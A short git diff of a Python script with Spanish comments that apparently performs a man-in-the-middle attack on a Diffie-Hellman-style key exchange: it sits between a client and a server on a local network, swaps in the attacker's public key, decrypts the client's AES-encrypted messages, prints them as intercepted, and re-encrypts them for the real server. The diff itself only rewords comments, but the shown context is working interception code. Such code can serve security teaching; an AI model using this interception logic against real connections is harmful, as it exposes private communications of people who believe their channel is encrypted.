@@ -31,11 +31,11 @@ attacker_public_bytes = attacker_public_key.public_bytes(
 
 # Crear sockets para interceptar entre el cliente y el servidor
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.bind(('192.168.1.14', 65432))  # Escuchar en el dispositivo atacante
+server_socket.bind(('192.168.1.14', 65432))  # IP propia y puerto para interceptar
 server_socket.listen()
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect(('192.168.1.15', 65432))  # Conectar al servidor real
+client_socket.connect(('192.168.1.15', 65432))  # IP del servidor y puerto
 
 # Interceptar la llave pública del servidor
 server_public_bytes = client_socket.recv(1024)
@@ -90,7 +90,7 @@ while True:
             break
         decrypted_message_from_client = aes_decrypt(derived_key_with_client, ciphertext_from_client)
         print(f"Mensaje interceptado del cliente: {decrypted_message_from_client.decode()}")
-        
+
         # Reenviar el mensaje descifrado al servidor (cifrado con la llave del servidor)
         ciphertext_to_server = aes_encrypt(derived_key_with_server, decrypted_message_from_client)
         client_socket.sendall(ciphertext_to_server)
